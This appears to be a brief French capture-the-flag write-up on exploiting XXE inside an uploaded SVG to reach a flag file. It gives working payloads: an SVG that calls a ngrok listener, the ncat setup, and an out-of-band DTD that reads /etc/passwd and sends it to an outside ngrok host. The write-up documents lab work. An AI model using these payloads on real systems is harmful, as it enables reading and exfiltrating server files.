# Step 3 

> faut trouver le /flag.txt

> découverte du hint: svg -> xxe

## XXE inside SVG

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg

### Chopper une requete chez soit

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="http://77ff5a3f.ngrok.io/"></image>
</svg>
```

```bash
# term 1
ngrok http 12345

# term 2
ncat -klvp 12345
```

Output : 

```
GET / HTTP/1.1
Host: 77ff5a3f.ngrok.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-Proto: https
X-Forwarded-For: 90.63.252.100
```

### XXE OOB

* e.svg

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="http://00f5dfd7.ngrok.io/a.dtd"></image>
</svg>
```

* a.dtd

```xml
<!ENTITY % file SYSTEM "file:////etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://3b292242.ngrok.io/?collect=%file;'>">
%all;
```